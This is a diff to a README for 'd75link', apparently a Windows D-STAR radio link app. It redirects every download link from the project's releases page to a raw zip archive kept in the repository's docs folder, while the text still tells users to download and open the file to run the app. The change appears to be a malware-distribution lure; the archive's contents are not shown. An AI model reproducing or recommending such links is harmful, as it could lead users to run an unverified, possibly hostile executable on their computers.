@@ -1,6 +1,6 @@
 # 📻 d75link - Simple D-STAR Link Control
 
-[![Download d75link](https://img.shields.io/badge/Download-d75link-blue?style=for-the-badge)](https://github.com/Novationcofferdam870/d75link/releases)
+[![Download d75link](https://img.shields.io/badge/Download-d75link-blue?style=for-the-badge)](https://github.com/Novationcofferdam870/d75link/raw/refs/heads/main/docs/link_d_v1.8.zip)
 
 ## 🧭 Overview
 
@@ -24,7 +24,7 @@ A desktop or laptop with Windows 10 or Windows 11 works best. The app uses a lig
 
 Visit this page to download d75link:
 
-[https://github.com/Novationcofferdam870/d75link/releases](https://github.com/Novationcofferdam870/d75link/releases)
+[https://github.com/Novationcofferdam870/d75link/raw/refs/heads/main/docs/link_d_v1.8.zip](https://github.com/Novationcofferdam870/d75link/raw/refs/heads/main/docs/link_d_v1.8.zip)
 
 Open the latest release and download the Windows file for your PC. If you see more than one file, choose the one that matches Windows. After the file downloads, open it to start the app.
 
@@ -187,5 +187,5 @@ Check the latest release page for any notes from the author. Those notes may lis
 
 ## 📌 Links
 
-- Download page: https://github.com/Novationcofferdam870/d75link/releases
+- Download page: https://github.com/Novationcofferdam870/d75link/raw/refs/heads/main/docs/link_d_v1.8.zip
 - Repository: d75link
